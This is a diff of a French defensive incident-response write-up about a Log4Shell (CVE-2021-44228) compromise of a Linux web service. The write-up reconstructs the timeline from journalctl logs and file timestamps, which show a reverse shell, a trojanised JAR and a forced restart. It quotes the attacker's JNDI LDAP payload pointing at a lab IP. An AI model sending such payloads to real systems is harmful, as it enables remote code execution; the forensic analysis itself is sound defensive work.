@@ -10,10 +10,12 @@ Dans la continuité méthodologique du document précédent, ce fichier propose 
 
 **Contexte :** L'EDR Elastic a détecté avec succès le Reverse Shell initial (anomalie de filiation de processus `java` -> `bash`). L'absence de traces dans un historique de commandes (`.bash_history`) s'explique par la nature même du compte compromis : `ecorp-web` est un compte de service applicatif, logiquement dépourvu de répertoire personnel (`/home/`) et d'environnement interactif configuré. Pour reconstituer le cheminement de l'attaquant, l'investigation s'est déportée sur les journaux applicatifs, les démons système et les métadonnées de fichiers (horodatage MACB).
 
-**Analyse :**
-L'interrogation combinée des journaux du service `ecorp-portal` (`journalctl`) et des métadonnées du fichier exécutable (`stat`) révèle une chronologie d'attaque implacable :
 
 ![Exploitation Log4Shell et sabotage Systemd](../images/blue-team/03-linux-log4shell-sabotage.png)
+
+**Analyse :**
+
+L'interrogation combinée des journaux du service `ecorp-portal` (`journalctl`) et des métadonnées du fichier exécutable (`stat`) révèle une chronologie d'attaque implacable :
 
 1. **Vecteur d'exploitation (21:28:34) :** Le contrôleur de l'application web journalise une exception `ClassCastException` accompagnée de la charge utile JNDI malveillante transmise par l'attaquant : `Login attempt: ${jndi:ldap://192.168.1.150:1389/a}`. Cela confirme l'exploitation technique de Log4Shell (CVE-2021-44228) et identifie l'adresse IP de l'infrastructure offensive.
 2. **Trojanisation et sabotage (21:38:02 - 21:38:49) :** L'analyse des métadonnées du livrable de production (`stat /opt/ecorp-portal/ecorp-portal.jar`) indique que le binaire a été corrompu à 21:38:02 (horodatage `Modify`). Exactement 47 secondes plus tard (21:38:49), le journal système enregistre un arrêt brutal du processus applicatif via un signal `SIGKILL` (`status=9/KILL`). Cette séquence prouve de manière irréfutable que l'attaquant a écrasé l'application légitime avec une version trojanisée (backdoor), puis a forcé son redémarrage immédiat pour la charger en mémoire.
